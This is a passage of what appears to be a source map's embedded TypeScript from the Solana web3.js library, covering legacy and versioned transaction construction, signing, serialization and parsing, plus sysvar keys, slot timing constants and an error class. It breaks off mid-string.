minContextSlot: number;\n  nonceInfo: NonceInformation;\n  /** One or more signatures */\n  signatures?: Array<SignaturePubkeyPair>;\n};\n\n/**\n * Nonce information to be used to build an offline Transaction.\n */\nexport type NonceInformation = {\n  /** The current blockhash stored in the nonce */\n  nonce: Blockhash;\n  /** AdvanceNonceAccount Instruction */\n  nonceInstruction: TransactionInstruction;\n};\n\n/**\n * @internal\n */\nexport interface TransactionJSON {\n  recentBlockhash: string | null;\n  feePayer: string | null;\n  nonceInfo: {\n    nonce: string;\n    nonceInstruction: TransactionInstructionJSON;\n  } | null;\n  instructions: TransactionInstructionJSON[];\n  signers: string[];\n}\n\n/**\n * Transaction class\n */\nexport class Transaction {\n  /**\n   * Signatures for the transaction.  Typically created by invoking the\n   * `sign()` method\n   */\n  signatures: Array<SignaturePubkeyPair> = [];\n\n  /**\n   * The first (payer) Transaction signature\n   *\n   * @returns {Buffer | null} Buffer of payer's signature\n   */\n  get signature(): Buffer | null {\n    if (this.signatures.length > 0) {\n      return this.signatures[0].signature;\n    }\n    return null;\n  }\n\n  /**\n   * The transaction fee payer\n   */\n  feePayer?: PublicKey;\n\n  /**\n   * The instructions to atomically execute\n   */\n  instructions: Array<TransactionInstruction> = [];\n\n  /**\n   * A recent transaction id. Must be populated by the caller\n   */\n  recentBlockhash?: Blockhash;\n\n  /**\n   * the last block chain can advance to before tx is declared expired\n   * */\n  lastValidBlockHeight?: number;\n\n  /**\n   * Optional Nonce information. If populated, transaction will use a durable\n   * Nonce hash instead of a recentBlockhash. Must be populated by the caller\n   */\n  nonceInfo?: NonceInformation;\n\n  /**\n   * If this is a nonce transaction this represents the minimum slot from which\n   * to evaluate if the nonce has advanced when attempting to confirm the\n   * transaction. This protects against a case where the transaction confirmation\n   * logic loads the nonce account from an old slot and assumes the mismatch in\n   * nonce value implies that the nonce has been advanced.\n   */\n  minNonceContextSlot?: number;\n\n  /**\n   * @internal\n   */\n  _message?: Message;\n\n  /**\n   * @internal\n   */\n  _json?: TransactionJSON;\n\n  // Construct a transaction with a blockhash and lastValidBlockHeight\n  constructor(opts?: TransactionBlockhashCtor);\n\n  // Construct a transaction using a durable nonce\n  constructor(opts?: TransactionNonceCtor);\n\n  /**\n   * @deprecated `TransactionCtorFields` has been deprecated and will be removed in a future version.\n   * Please supply a `TransactionBlockhashCtor` instead.\n   */\n  constructor(opts?: TransactionCtorFields_DEPRECATED);\n\n  /**\n   * Construct an empty Transaction\n   */\n  constructor(\n    opts?:\n      | TransactionBlockhashCtor\n      | TransactionNonceCtor\n      | TransactionCtorFields_DEPRECATED,\n  ) {\n    if (!opts) {\n      return;\n    }\n    if (opts.feePayer) {\n      this.feePayer = opts.feePayer;\n    }\n    if (opts.signatures) {\n      this.signatures = opts.signatures;\n    }\n    if (Object.prototype.hasOwnProperty.call(opts, 'nonceInfo')) {\n      const {minContextSlot, nonceInfo} = opts as TransactionNonceCtor;\n      this.minNonceContextSlot = minContextSlot;\n      this.nonceInfo = nonceInfo;\n    } else if (\n      Object.prototype.hasOwnProperty.call(opts, 'lastValidBlockHeight')\n    ) {\n      const {blockhash, lastValidBlockHeight} =\n        opts as TransactionBlockhashCtor;\n      this.recentBlockhash = blockhash;\n      this.lastValidBlockHeight = lastValidBlockHeight;\n    } else {\n      const {recentBlockhash, nonceInfo} =\n        opts as TransactionCtorFields_DEPRECATED;\n      if (nonceInfo) {\n        this.nonceInfo = nonceInfo;\n      }\n      this.recentBlockhash = recentBlockhash;\n    }\n  }\n\n  /**\n   * @internal\n   */\n  toJSON(): TransactionJSON {\n    return {\n      recentBlockhash: this.recentBlockhash || null,\n      feePayer: this.feePayer ? this.feePayer.toJSON() : null,\n      nonceInfo: this.nonceInfo\n        ? {\n            nonce: this.nonceInfo.nonce,\n            nonceInstruction: this.nonceInfo.nonceInstruction.toJSON(),\n          }\n        : null,\n      instructions: this.instructions.map(instruction => instruction.toJSON()),\n      signers: this.signatures.map(({publicKey}) => {\n        return publicKey.toJSON();\n      }),\n    };\n  }\n\n  /**\n   * Add one or more instructions to this Transaction\n   *\n   * @param {Array< Transaction | TransactionInstruction | TransactionInstructionCtorFields >} items - Instructions to add to the Transaction\n   */\n  add(\n    ...items: Array<\n      Transaction | TransactionInstruction | TransactionInstructionCtorFields\n    >\n  ): Transaction {\n    if (items.length === 0) {\n      throw new Error('No instructions');\n    }\n\n    items.forEach((item: any) => {\n      if ('instructions' in item) {\n        this.instructions = this.instructions.concat(item.instructions);\n      } else if ('data' in item && 'programId' in item && 'keys' in item) {\n        this.instructions.push(item);\n      } else {\n        this.instructions.push(new TransactionInstruction(item));\n      }\n    });\n    return this;\n  }\n\n  /**\n   * Compile transaction data\n   */\n  compileMessage(): Message {\n    if (\n      this._message &&\n      JSON.stringify(this.toJSON()) === JSON.stringify(this._json)\n    ) {\n      return this._message;\n    }\n\n    let recentBlockhash;\n    let instructions: TransactionInstruction[];\n    if (this.nonceInfo) {\n      recentBlockhash = this.nonceInfo.nonce;\n      if (this.instructions[0] != this.nonceInfo.nonceInstruction) {\n        instructions = [this.nonceInfo.nonceInstruction, ...this.instructions];\n      } else {\n        instructions = this.instructions;\n      }\n    } else {\n      recentBlockhash = this.recentBlockhash;\n      instructions = this.instructions;\n    }\n    if (!recentBlockhash) {\n      throw new Error('Transaction recentBlockhash required');\n    }\n\n    if (instructions.length < 1) {\n      console.warn('No instructions provided');\n    }\n\n    let feePayer: PublicKey;\n    if (this.feePayer) {\n      feePayer = this.feePayer;\n    } else if (this.signatures.length > 0 && this.signatures[0].publicKey) {\n      // Use implicit fee payer\n      feePayer = this.signatures[0].publicKey;\n    } else {\n      throw new Error('Transaction fee payer required');\n    }\n\n    for (let i = 0; i < instructions.length; i++) {\n      if (instructions[i].programId === undefined) {\n        throw new Error(\n          `Transaction instruction index ${i} has undefined program id`,\n        );\n      }\n    }\n\n    const programIds: string[] = [];\n    const accountMetas: AccountMeta[] = [];\n    instructions.forEach(instruction => {\n      instruction.keys.forEach(accountMeta => {\n        accountMetas.push({...accountMeta});\n      });\n\n      const programId = instruction.programId.toString();\n      if (!programIds.includes(programId)) {\n        programIds.push(programId);\n      }\n    });\n\n    // Append programID account metas\n    programIds.forEach(programId => {\n      accountMetas.push({\n        pubkey: new PublicKey(programId),\n        isSigner: false,\n        isWritable: false,\n      });\n    });\n\n    // Cull duplicate account metas\n    const uniqueMetas: AccountMeta[] = [];\n    accountMetas.forEach(accountMeta => {\n      const pubkeyString = accountMeta.pubkey.toString();\n      const uniqueIndex = uniqueMetas.findIndex(x => {\n        return x.pubkey.toString() === pubkeyString;\n      });\n      if (uniqueIndex > -1) {\n        uniqueMetas[uniqueIndex].isWritable =\n          uniqueMetas[uniqueIndex].isWritable || accountMeta.isWritable;\n        uniqueMetas[uniqueIndex].isSigner =\n          uniqueMetas[uniqueIndex].isSigner || accountMeta.isSigner;\n      } else {\n        uniqueMetas.push(accountMeta);\n      }\n    });\n\n    // Sort. Prioritizing first by signer, then by writable\n    uniqueMetas.sort(function (x, y) {\n      if (x.isSigner !== y.isSigner) {\n        // Signers always come before non-signers\n        return x.isSigner ? -1 : 1;\n      }\n      if (x.isWritable !== y.isWritable) {\n        // Writable accounts always come before read-only accounts\n        return x.isWritable ? -1 : 1;\n      }\n      // Otherwise, sort by pubkey, stringwise.\n      const options = {\n        localeMatcher: 'best fit',\n        usage: 'sort',\n        sensitivity: 'variant',\n        ignorePunctuation: false,\n        numeric: false,\n        caseFirst: 'lower',\n      } as Intl.CollatorOptions;\n      return x.pubkey\n        .toBase58()\n        .localeCompare(y.pubkey.toBase58(), 'en', options);\n    });\n\n    // Move fee payer to the front\n    const feePayerIndex = uniqueMetas.findIndex(x => {\n      return x.pubkey.equals(feePayer);\n    });\n    if (feePayerIndex > -1) {\n      const [payerMeta] = uniqueMetas.splice(feePayerIndex, 1);\n      payerMeta.isSigner = true;\n      payerMeta.isWritable = true;\n      uniqueMetas.unshift(payerMeta);\n    } else {\n      uniqueMetas.unshift({\n        pubkey: feePayer,\n        isSigner: true,\n        isWritable: true,\n      });\n    }\n\n    // Disallow unknown signers\n    for (const signature of this.signatures) {\n      const uniqueIndex = uniqueMetas.findIndex(x => {\n        return x.pubkey.equals(signature.publicKey);\n      });\n      if (uniqueIndex > -1) {\n        if (!uniqueMetas[uniqueIndex].isSigner) {\n          uniqueMetas[uniqueIndex].isSigner = true;\n          console.warn(\n            'Transaction references a signature that is unnecessary, ' +\n              'only the fee payer and instruction signer accounts should sign a transaction. ' +\n              'This behavior is deprecated and will throw an error in the next major version release.',\n          );\n        }\n      } else {\n        throw new Error(`unknown signer: ${signature.publicKey.toString()}`);\n      }\n    }\n\n    let numRequiredSignatures = 0;\n    let numReadonlySignedAccounts = 0;\n    let numReadonlyUnsignedAccounts = 0;\n\n    // Split out signing from non-signing keys and count header values\n    const signedKeys: string[] = [];\n    const unsignedKeys: string[] = [];\n    uniqueMetas.forEach(({pubkey, isSigner, isWritable}) => {\n      if (isSigner) {\n        signedKeys.push(pubkey.toString());\n        numRequiredSignatures += 1;\n        if (!isWritable) {\n          numReadonlySignedAccounts += 1;\n        }\n      } else {\n        unsignedKeys.push(pubkey.toString());\n        if (!isWritable) {\n          numReadonlyUnsignedAccounts += 1;\n        }\n      }\n    });\n\n    const accountKeys = signedKeys.concat(unsignedKeys);\n    const compiledInstructions: CompiledInstruction[] = instructions.map(\n      instruction => {\n        const {data, programId} = instruction;\n        return {\n          programIdIndex: accountKeys.indexOf(programId.toString()),\n          accounts: instruction.keys.map(meta =>\n            accountKeys.indexOf(meta.pubkey.toString()),\n          ),\n          data: bs58.encode(data),\n        };\n      },\n    );\n\n    compiledInstructions.forEach(instruction => {\n      invariant(instruction.programIdIndex >= 0);\n      instruction.accounts.forEach(keyIndex => invariant(keyIndex >= 0));\n    });\n\n    return new Message({\n      header: {\n        numRequiredSignatures,\n        numReadonlySignedAccounts,\n        numReadonlyUnsignedAccounts,\n      },\n      accountKeys,\n      recentBlockhash,\n      instructions: compiledInstructions,\n    });\n  }\n\n  /**\n   * @internal\n   */\n  _compile(): Message {\n    const message = this.compileMessage();\n    const signedKeys = message.accountKeys.slice(\n      0,\n      message.header.numRequiredSignatures,\n    );\n\n    if (this.signatures.length === signedKeys.length) {\n      const valid = this.signatures.every((pair, index) => {\n        return signedKeys[index].equals(pair.publicKey);\n      });\n\n      if (valid) return message;\n    }\n\n    this.signatures = signedKeys.map(publicKey => ({\n      signature: null,\n      publicKey,\n    }));\n\n    return message;\n  }\n\n  /**\n   * Get a buffer of the Transaction data that need to be covered by signatures\n   */\n  serializeMessage(): Buffer {\n    return this._compile().serialize();\n  }\n\n  /**\n   * Get the estimated fee associated with a transaction\n   *\n   * @param {Connection} connection Connection to RPC Endpoint.\n   *\n   * @returns {Promise<number | null>} The estimated fee for the transaction\n   */\n  async getEstimatedFee(connection: Connection): Promise<number | null> {\n    return (await connection.getFeeForMessage(this.compileMessage())).value;\n  }\n\n  /**\n   * Specify the public keys which will be used to sign the Transaction.\n   * The first signer will be used as the transaction fee payer account.\n   *\n   * Signatures can be added with either `partialSign` or `addSignature`\n   *\n   * @deprecated Deprecated since v0.84.0. Only the fee payer needs to be\n   * specified and it can be set in the Transaction constructor or with the\n   * `feePayer` property.\n   */\n  setSigners(...signers: Array<PublicKey>) {\n    if (signers.length === 0) {\n      throw new Error('No signers');\n    }\n\n    const seen = new Set();\n    this.signatures = signers\n      .filter(publicKey => {\n        const key = publicKey.toString();\n        if (seen.has(key)) {\n          return false;\n        } else {\n          seen.add(key);\n          return true;\n        }\n      })\n      .map(publicKey => ({signature: null, publicKey}));\n  }\n\n  /**\n   * Sign the Transaction with the specified signers. Multiple signatures may\n   * be applied to a Transaction. The first signature is considered \"primary\"\n   * and is used identify and confirm transactions.\n   *\n   * If the Transaction `feePayer` is not set, the first signer will be used\n   * as the transaction fee payer account.\n   *\n   * Transaction fields should not be modified after the first call to `sign`,\n   * as doing so may invalidate the signature and cause the Transaction to be\n   * rejected.\n   *\n   * The Transaction must be assigned a valid `recentBlockhash` before invoking this method\n   *\n   * @param {Array<Signer>} signers Array of signers that will sign the transaction\n   */\n  sign(...signers: Array<Signer>) {\n    if (signers.length === 0) {\n      throw new Error('No signers');\n    }\n\n    // Dedupe signers\n    const seen = new Set();\n    const uniqueSigners = [];\n    for (const signer of signers) {\n      const key = signer.publicKey.toString();\n      if (seen.has(key)) {\n        continue;\n      } else {\n        seen.add(key);\n        uniqueSigners.push(signer);\n      }\n    }\n\n    this.signatures = uniqueSigners.map(signer => ({\n      signature: null,\n      publicKey: signer.publicKey,\n    }));\n\n    const message = this._compile();\n    this._partialSign(message, ...uniqueSigners);\n  }\n\n  /**\n   * Partially sign a transaction with the specified accounts. All accounts must\n   * correspond to either the fee payer or a signer account in the transaction\n   * instructions.\n   *\n   * All the caveats from the `sign` method apply to `partialSign`\n   *\n   * @param {Array<Signer>} signers Array of signers that will sign the transaction\n   */\n  partialSign(...signers: Array<Signer>) {\n    if (signers.length === 0) {\n      throw new Error('No signers');\n    }\n\n    // Dedupe signers\n    const seen = new Set();\n    const uniqueSigners = [];\n    for (const signer of signers) {\n      const key = signer.publicKey.toString();\n      if (seen.has(key)) {\n        continue;\n      } else {\n        seen.add(key);\n        uniqueSigners.push(signer);\n      }\n    }\n\n    const message = this._compile();\n    this._partialSign(message, ...uniqueSigners);\n  }\n\n  /**\n   * @internal\n   */\n  _partialSign(message: Message, ...signers: Array<Signer>) {\n    const signData = message.serialize();\n    signers.forEach(signer => {\n      const signature = sign(signData, signer.secretKey);\n      this._addSignature(signer.publicKey, toBuffer(signature));\n    });\n  }\n\n  /**\n   * Add an externally created signature to a transaction. The public key\n   * must correspond to either the fee payer or a signer account in the transaction\n   * instructions.\n   *\n   * @param {PublicKey} pubkey Public key that will be added to the transaction.\n   * @param {Buffer} signature An externally created signature to add to the transaction.\n   */\n  addSignature(pubkey: PublicKey, signature: Buffer) {\n    this._compile(); // Ensure signatures array is populated\n    this._addSignature(pubkey, signature);\n  }\n\n  /**\n   * @internal\n   */\n  _addSignature(pubkey: PublicKey, signature: Buffer) {\n    invariant(signature.length === 64);\n\n    const index = this.signatures.findIndex(sigpair =>\n      pubkey.equals(sigpair.publicKey),\n    );\n    if (index < 0) {\n      throw new Error(`unknown signer: ${pubkey.toString()}`);\n    }\n\n    this.signatures[index].signature = Buffer.from(signature);\n  }\n\n  /**\n   * Verify signatures of a Transaction\n   * Optional parameter specifies if we're expecting a fully signed Transaction or a partially signed one.\n   * If no boolean is provided, we expect a fully signed Transaction by default.\n   *\n   * @param {boolean} [requireAllSignatures=true] Require a fully signed Transaction\n   */\n  verifySignatures(requireAllSignatures: boolean = true): boolean {\n    const signatureErrors = this._getMessageSignednessErrors(\n      this.serializeMessage(),\n      requireAllSignatures,\n    );\n    return !signatureErrors;\n  }\n\n  /**\n   * @internal\n   */\n  _getMessageSignednessErrors(\n    message: Uint8Array,\n    requireAllSignatures: boolean,\n  ): MessageSignednessErrors | undefined {\n    const errors: MessageSignednessErrors = {};\n    for (const {signature, publicKey} of this.signatures) {\n      if (signature === null) {\n        if (requireAllSignatures) {\n          (errors.missing ||= []).push(publicKey);\n        }\n      } else {\n        if (!verify(signature, message, publicKey.toBytes())) {\n          (errors.invalid ||= []).push(publicKey);\n        }\n      }\n    }\n    return errors.invalid || errors.missing ? errors : undefined;\n  }\n\n  /**\n   * Serialize the Transaction in the wire format.\n   *\n   * @param {Buffer} [config] Config of transaction.\n   *\n   * @returns {Buffer} Signature of transaction in wire format.\n   */\n  serialize(config?: SerializeConfig): Buffer {\n    const {requireAllSignatures, verifySignatures} = Object.assign(\n      {requireAllSignatures: true, verifySignatures: true},\n      config,\n    );\n\n    const signData = this.serializeMessage();\n    if (verifySignatures) {\n      const sigErrors = this._getMessageSignednessErrors(\n        signData,\n        requireAllSignatures,\n      );\n      if (sigErrors) {\n        let errorMessage = 'Signature verification failed.';\n        if (sigErrors.invalid) {\n          errorMessage += `\\nInvalid signature for public key${\n            sigErrors.invalid.length === 1 ? '' : '(s)'\n          } [\\`${sigErrors.invalid.map(p => p.toBase58()).join('`, `')}\\`].`;\n        }\n        if (sigErrors.missing) {\n          errorMessage += `\\nMissing signature for public key${\n            sigErrors.missing.length === 1 ? '' : '(s)'\n          } [\\`${sigErrors.missing.map(p => p.toBase58()).join('`, `')}\\`].`;\n        }\n        throw new Error(errorMessage);\n      }\n    }\n\n    return this._serialize(signData);\n  }\n\n  /**\n   * @internal\n   */\n  _serialize(signData: Buffer): Buffer {\n    const {signatures} = this;\n    const signatureCount: number[] = [];\n    shortvec.encodeLength(signatureCount, signatures.length);\n    const transactionLength =\n      signatureCount.length + signatures.length * 64 + signData.length;\n    const wireTransaction = Buffer.alloc(transactionLength);\n    invariant(signatures.length < 256);\n    Buffer.from(signatureCount).copy(wireTransaction, 0);\n    signatures.forEach(({signature}, index) => {\n      if (signature !== null) {\n        invariant(signature.length === 64, `signature has invalid length`);\n        Buffer.from(signature).copy(\n          wireTransaction,\n          signatureCount.length + index * 64,\n        );\n      }\n    });\n    signData.copy(\n      wireTransaction,\n      signatureCount.length + signatures.length * 64,\n    );\n    invariant(\n      wireTransaction.length <= PACKET_DATA_SIZE,\n      `Transaction too large: ${wireTransaction.length} > ${PACKET_DATA_SIZE}`,\n    );\n    return wireTransaction;\n  }\n\n  /**\n   * Deprecated method\n   * @internal\n   */\n  get keys(): Array<PublicKey> {\n    invariant(this.instructions.length === 1);\n    return this.instructions[0].keys.map(keyObj => keyObj.pubkey);\n  }\n\n  /**\n   * Deprecated method\n   * @internal\n   */\n  get programId(): PublicKey {\n    invariant(this.instructions.length === 1);\n    return this.instructions[0].programId;\n  }\n\n  /**\n   * Deprecated method\n   * @internal\n   */\n  get data(): Buffer {\n    invariant(this.instructions.length === 1);\n    return this.instructions[0].data;\n  }\n\n  /**\n   * Parse a wire transaction into a Transaction object.\n   *\n   * @param {Buffer | Uint8Array | Array<number>} buffer Signature of wire Transaction\n   *\n   * @returns {Transaction} Transaction associated with the signature\n   */\n  static from(buffer: Buffer | Uint8Array | Array<number>): Transaction {\n    // Slice up wire data\n    let byteArray = [...buffer];\n\n    const signatureCount = shortvec.decodeLength(byteArray);\n    let signatures = [];\n    for (let i = 0; i < signatureCount; i++) {\n      const signature = guardedSplice(byteArray, 0, SIGNATURE_LENGTH_IN_BYTES);\n      signatures.push(bs58.encode(Buffer.from(signature)));\n    }\n\n    return Transaction.populate(Message.from(byteArray), signatures);\n  }\n\n  /**\n   * Populate Transaction object from message and signatures\n   *\n   * @param {Message} message Message of transaction\n   * @param {Array<string>} signatures List of signatures to assign to the transaction\n   *\n   * @returns {Transaction} The populated Transaction\n   */\n  static populate(\n    message: Message,\n    signatures: Array<string> = [],\n  ): Transaction {\n    const transaction = new Transaction();\n    transaction.recentBlockhash = message.recentBlockhash;\n    if (message.header.numRequiredSignatures > 0) {\n      transaction.feePayer = message.accountKeys[0];\n    }\n    signatures.forEach((signature, index) => {\n      const sigPubkeyPair = {\n        signature:\n          signature == bs58.encode(DEFAULT_SIGNATURE)\n            ? null\n            : bs58.decode(signature),\n        publicKey: message.accountKeys[index],\n      };\n      transaction.signatures.push(sigPubkeyPair);\n    });\n\n    message.instructions.forEach(instruction => {\n      const keys = instruction.accounts.map(account => {\n        const pubkey = message.accountKeys[account];\n        return {\n          pubkey,\n          isSigner:\n            transaction.signatures.some(\n              keyObj => keyObj.publicKey.toString() === pubkey.toString(),\n            ) || message.isAccountSigner(account),\n          isWritable: message.isAccountWritable(account),\n        };\n      });\n\n      transaction.instructions.push(\n        new TransactionInstruction({\n          keys,\n          programId: message.accountKeys[instruction.programIdIndex],\n          data: bs58.decode(instruction.data),\n        }),\n      );\n    });\n\n    transaction._message = message;\n    transaction._json = transaction.toJSON();\n\n    return transaction;\n  }\n}\n","import {AccountKeysFromLookups} from '../message/account-keys';\nimport assert from '../utils/assert';\nimport {toBuffer} from '../utils/to-buffer';\nimport {Blockhash} from '../blockhash';\nimport {Message, MessageV0, VersionedMessage} from '../message';\nimport {PublicKey} from '../publickey';\nimport {AddressLookupTableAccount} from '../programs';\nimport {AccountMeta, TransactionInstruction} from './legacy';\n\nexport type TransactionMessageArgs = {\n  payerKey: PublicKey;\n  instructions: Array<TransactionInstruction>;\n  recentBlockhash: Blockhash;\n};\n\nexport type DecompileArgs =\n  | {\n      accountKeysFromLookups: AccountKeysFromLookups;\n    }\n  | {\n      addressLookupTableAccounts: AddressLookupTableAccount[];\n    };\n\nexport class TransactionMessage {\n  payerKey: PublicKey;\n  instructions: Array<TransactionInstruction>;\n  recentBlockhash: Blockhash;\n\n  constructor(args: TransactionMessageArgs) {\n    this.payerKey = args.payerKey;\n    this.instructions = args.instructions;\n    this.recentBlockhash = args.recentBlockhash;\n  }\n\n  static decompile(\n    message: VersionedMessage,\n    args?: DecompileArgs,\n  ): TransactionMessage {\n    const {header, compiledInstructions, recentBlockhash} = message;\n\n    const {\n      numRequiredSignatures,\n      numReadonlySignedAccounts,\n      numReadonlyUnsignedAccounts,\n    } = header;\n\n    const numWritableSignedAccounts =\n      numRequiredSignatures - numReadonlySignedAccounts;\n    assert(numWritableSignedAccounts > 0, 'Message header is invalid');\n\n    const numWritableUnsignedAccounts =\n      message.staticAccountKeys.length -\n      numRequiredSignatures -\n      numReadonlyUnsignedAccounts;\n    assert(numWritableUnsignedAccounts >= 0, 'Message header is invalid');\n\n    const accountKeys = message.getAccountKeys(args);\n    const payerKey = accountKeys.get(0);\n    if (payerKey === undefined) {\n      throw new Error(\n        'Failed to decompile message because no account keys were found',\n      );\n    }\n\n    const instructions: TransactionInstruction[] = [];\n    for (const compiledIx of compiledInstructions) {\n      const keys: AccountMeta[] = [];\n\n      for (const keyIndex of compiledIx.accountKeyIndexes) {\n        const pubkey = accountKeys.get(keyIndex);\n        if (pubkey === undefined) {\n          throw new Error(\n            `Failed to find key for account key index ${keyIndex}`,\n          );\n        }\n\n        const isSigner = keyIndex < numRequiredSignatures;\n\n        let isWritable;\n        if (isSigner) {\n          isWritable = keyIndex < numWritableSignedAccounts;\n        } else if (keyIndex < accountKeys.staticAccountKeys.length) {\n          isWritable =\n            keyIndex - numRequiredSignatures < numWritableUnsignedAccounts;\n        } else {\n          isWritable =\n            keyIndex - accountKeys.staticAccountKeys.length <\n            // accountKeysFromLookups cannot be undefined because we already found a pubkey for this index above\n            accountKeys.accountKeysFromLookups!.writable.length;\n        }\n\n        keys.push({\n          pubkey,\n          isSigner: keyIndex < header.numRequiredSignatures,\n          isWritable,\n        });\n      }\n\n      const programId = accountKeys.get(compiledIx.programIdIndex);\n      if (programId === undefined) {\n        throw new Error(\n          `Failed to find program id for program id index ${compiledIx.programIdIndex}`,\n        );\n      }\n\n      instructions.push(\n        new TransactionInstruction({\n          programId,\n          data: toBuffer(compiledIx.data),\n          keys,\n        }),\n      );\n    }\n\n    return new TransactionMessage({\n      payerKey,\n      instructions,\n      recentBlockhash,\n    });\n  }\n\n  compileToLegacyMessage(): Message {\n    return Message.compile({\n      payerKey: this.payerKey,\n      recentBlockhash: this.recentBlockhash,\n      instructions: this.instructions,\n    });\n  }\n\n  compileToV0Message(\n    addressLookupTableAccounts?: AddressLookupTableAccount[],\n  ): MessageV0 {\n    return MessageV0.compile({\n      payerKey: this.payerKey,\n      recentBlockhash: this.recentBlockhash,\n      instructions: this.instructions,\n      addressLookupTableAccounts,\n    });\n  }\n}\n","import * as BufferLayout from '@solana/buffer-layout';\n\nimport {Signer} from '../keypair';\nimport assert from '../utils/assert';\nimport {VersionedMessage} from '../message/versioned';\nimport {SIGNATURE_LENGTH_IN_BYTES} from './constants';\nimport * as shortvec from '../utils/shortvec-encoding';\nimport * as Layout from '../layout';\nimport {sign} from '../utils/ed25519';\nimport {PublicKey} from '../publickey';\nimport {guardedSplice} from '../utils/guarded-array-utils';\n\nexport type TransactionVersion = 'legacy' | 0;\n\n/**\n * Versioned transaction class\n */\nexport class VersionedTransaction {\n  signatures: Array<Uint8Array>;\n  message: VersionedMessage;\n\n  get version(): TransactionVersion {\n    return this.message.version;\n  }\n\n  constructor(message: VersionedMessage, signatures?: Array<Uint8Array>) {\n    if (signatures !== undefined) {\n      assert(\n        signatures.length === message.header.numRequiredSignatures,\n        'Expected signatures length to be equal to the number of required signatures',\n      );\n      this.signatures = signatures;\n    } else {\n      const defaultSignatures = [];\n      for (let i = 0; i < message.header.numRequiredSignatures; i++) {\n        defaultSignatures.push(new Uint8Array(SIGNATURE_LENGTH_IN_BYTES));\n      }\n      this.signatures = defaultSignatures;\n    }\n    this.message = message;\n  }\n\n  serialize(): Uint8Array {\n    const serializedMessage = this.message.serialize();\n\n    const encodedSignaturesLength = Array<number>();\n    shortvec.encodeLength(encodedSignaturesLength, this.signatures.length);\n\n    const transactionLayout = BufferLayout.struct<{\n      encodedSignaturesLength: Uint8Array;\n      signatures: Array<Uint8Array>;\n      serializedMessage: Uint8Array;\n    }>([\n      BufferLayout.blob(\n        encodedSignaturesLength.length,\n        'encodedSignaturesLength',\n      ),\n      BufferLayout.seq(\n        Layout.signature(),\n        this.signatures.length,\n        'signatures',\n      ),\n      BufferLayout.blob(serializedMessage.length, 'serializedMessage'),\n    ]);\n\n    const serializedTransaction = new Uint8Array(2048);\n    const serializedTransactionLength = transactionLayout.encode(\n      {\n        encodedSignaturesLength: new Uint8Array(encodedSignaturesLength),\n        signatures: this.signatures,\n        serializedMessage,\n      },\n      serializedTransaction,\n    );\n\n    return serializedTransaction.slice(0, serializedTransactionLength);\n  }\n\n  static deserialize(serializedTransaction: Uint8Array): VersionedTransaction {\n    let byteArray = [...serializedTransaction];\n\n    const signatures = [];\n    const signaturesLength = shortvec.decodeLength(byteArray);\n    for (let i = 0; i < signaturesLength; i++) {\n      signatures.push(\n        new Uint8Array(guardedSplice(byteArray, 0, SIGNATURE_LENGTH_IN_BYTES)),\n      );\n    }\n\n    const message = VersionedMessage.deserialize(new Uint8Array(byteArray));\n    return new VersionedTransaction(message, signatures);\n  }\n\n  sign(signers: Array<Signer>) {\n    const messageData = this.message.serialize();\n    const signerPubkeys = this.message.staticAccountKeys.slice(\n      0,\n      this.message.header.numRequiredSignatures,\n    );\n    for (const signer of signers) {\n      const signerIndex = signerPubkeys.findIndex(pubkey =>\n        pubkey.equals(signer.publicKey),\n      );\n      assert(\n        signerIndex >= 0,\n        `Cannot sign with non signer key ${signer.publicKey.toBase58()}`,\n      );\n      this.signatures[signerIndex] = sign(messageData, signer.secretKey);\n    }\n  }\n\n  addSignature(publicKey: PublicKey, signature: Uint8Array) {\n    assert(signature.byteLength === 64, 'Signature must be 64 bytes long');\n    const signerPubkeys = this.message.staticAccountKeys.slice(\n      0,\n      this.message.header.numRequiredSignatures,\n    );\n    const signerIndex = signerPubkeys.findIndex(pubkey =>\n      pubkey.equals(publicKey),\n    );\n    assert(\n      signerIndex >= 0,\n      `Can not add signature; \\`${publicKey.toBase58()}\\` is not required to sign this transaction`,\n    );\n    this.signatures[signerIndex] = signature;\n  }\n}\n","// TODO: These constants should be removed in favor of reading them out of a\n// Syscall account\n\n/**\n * @internal\n */\nexport const NUM_TICKS_PER_SECOND = 160;\n\n/**\n * @internal\n */\nexport const DEFAULT_TICKS_PER_SLOT = 64;\n\n/**\n * @internal\n */\nexport const NUM_SLOTS_PER_SECOND =\n  NUM_TICKS_PER_SECOND / DEFAULT_TICKS_PER_SLOT;\n\n/**\n * @internal\n */\nexport const MS_PER_SLOT = 1000 / NUM_SLOTS_PER_SECOND;\n","import {PublicKey} from './publickey';\n\nexport const SYSVAR_CLOCK_PUBKEY = new PublicKey(\n  'SysvarC1ock11111111111111111111111111111111',\n);\n\nexport const SYSVAR_EPOCH_SCHEDULE_PUBKEY = new PublicKey(\n  'SysvarEpochSchedu1e111111111111111111111111',\n);\n\nexport const SYSVAR_INSTRUCTIONS_PUBKEY = new PublicKey(\n  'Sysvar1nstructions1111111111111111111111111',\n);\n\nexport const SYSVAR_RECENT_BLOCKHASHES_PUBKEY = new PublicKey(\n  'SysvarRecentB1ockHashes11111111111111111111',\n);\n\nexport const SYSVAR_RENT_PUBKEY = new PublicKey(\n  'SysvarRent111111111111111111111111111111111',\n);\n\nexport const SYSVAR_REWARDS_PUBKEY = new PublicKey(\n  'SysvarRewards111111111111111111111111111111',\n);\n\nexport const SYSVAR_SLOT_HASHES_PUBKEY = new PublicKey(\n  'SysvarS1otHashes111111111111111111111111111',\n);\n\nexport const SYSVAR_SLOT_HISTORY_PUBKEY = new PublicKey(\n  'SysvarS1otHistory11111111111111111111111111',\n);\n\nexport const SYSVAR_STAKE_HISTORY_PUBKEY = new PublicKey(\n  'SysvarStakeHistory1111111111111111111111111',\n);\n","import {Connection} from './connection';\nimport {TransactionSignature} from './transaction';\n\nexport class SendTransactionError extends Error {\n  private signature: TransactionSignature;\n  private transactionMessage: string;\n  private transactionLogs: string[] | Promise<string[]> | undefined;\n\n  constructor({\n    action,\n    signature,\n    transactionMessage,\n    logs,\n  }: {\n    action: 'send' | 'simulate';\n    signature: TransactionSignature;\n    transactionMessage: string;\n    logs?: string[];\n  }) {\n    const maybeLogsOutput = logs\n      ? `Logs: \\n${JSON.stringify(logs.slice(-10), null, 2)}. `\n      : '';\n    const guideText =\n      '\\nCatch the `SendTransactionError` and call `getLogs()` on it for full details.';\n    let message: string;\n    switch (action) {\n      case 'send':\n        message =\n          `Transaction ${signature} resulted in an error. \\n` +\n          `${transactionMessage}. ` +\n          maybeLogsOutput +\n          guideText;\n        break;\n      case 'simulate':\n        message =\n          `Simulation failed. \\nMessage: ${transactionMessage}. \\n` +\n          maybeLogsOutput +\n          guideText;\n        break;\n      default: {\n        message = `Unknown action 